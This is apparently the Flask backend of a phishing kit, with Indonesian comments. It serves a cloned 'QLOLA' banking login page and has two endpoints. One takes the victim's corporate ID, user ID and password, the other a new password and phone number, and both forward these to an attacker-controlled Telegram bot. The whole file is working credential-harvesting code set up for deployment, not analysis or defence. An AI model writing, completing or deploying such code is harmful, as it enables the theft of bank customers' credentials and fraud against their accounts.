from flask import Flask, request, jsonify, send_from_directory
import os
import urllib.request
import json

app = Flask(__name__)

# ==========================================
# 1. KONFIGURASI TELEGRAM
# ==========================================
# Coba ambil dari Environment Variable (untuk Vercel nanti)
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

# Jika kosong, ambil dari config.json (untuk localhost sekarang)
if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
            TELEGRAM_TOKEN = config['TELEGRAM_TOKEN']
            TELEGRAM_CHAT_ID = config['TELEGRAM_CHAT_ID']
    except FileNotFoundError:
        print("❌ Error: config.json tidak ditemukan dan Environment Variable kosong!")

def send_to_telegram(pesan):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        raise ValueError("Token atau Chat ID Telegram belum diatur.")
    
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = json.dumps({
        "chat_id": TELEGRAM_CHAT_ID,
        "text": pesan,
        "parse_mode": "HTML"
    }).encode('utf-8')
    req = urllib.request.Request(url, data=payload, headers={'Content-Type': 'application/json'})
    urllib.request.urlopen(req)

# ==========================================
# 2. API ROUTES (Untuk kirim data ke Telegram)
# ==========================================
@app.route('/api/send', methods=['POST'])
def api_send():
    data = request.json
    pesan = f"🔐 <b>QLOLA LOGIN</b>\n\n🏢 <b>Corporate:</b> {data.get('corpId')}\n👤 <b>User:</b> {data.get('userId')}\n🔑 <b>Sandi:</b> {data.get('password')}"
    try:
        send_to_telegram(pesan)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print("Error Telegram Login:", e)
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/reset', methods=['POST'])
def api_reset():
    data = request.json
    pesan = f"🔄 <b>QLOLA RESET PASSWORD</b>\n\n🔑 <b>Sandi Baru:</b> {data.get('newPassword')}\n📱 <b>No HP:</b> +62 {data.get('phone')}"
    try:
        send_to_telegram(pesan)
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print("Error Telegram Reset:", e)
        return jsonify({"status": "error", "message": str(e)}), 500

# ==========================================
# 3. STATIC FILES ROUTES (Untuk tampilkan UI)
# ==========================================
@app.route('/')
def home():
    # Menampilkan halaman utama (index.html)
    return send_from_directory('.', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    # Menampilkan file lain seperti script.js, style.css, dashboard.html, dll.
    if os.path.exists(path):
        return send_from_directory('.', path)
    return "File tidak ditemukan", 404

# ==========================================
# 4. JALANKAN SERVER (Untuk Localhost)
# ==========================================
if __name__ == '__main__':
    print("✅ Server Flask berjalan di http://localhost:8080")
    app.run(host='0.0.0.0', port=8080, debug=True)
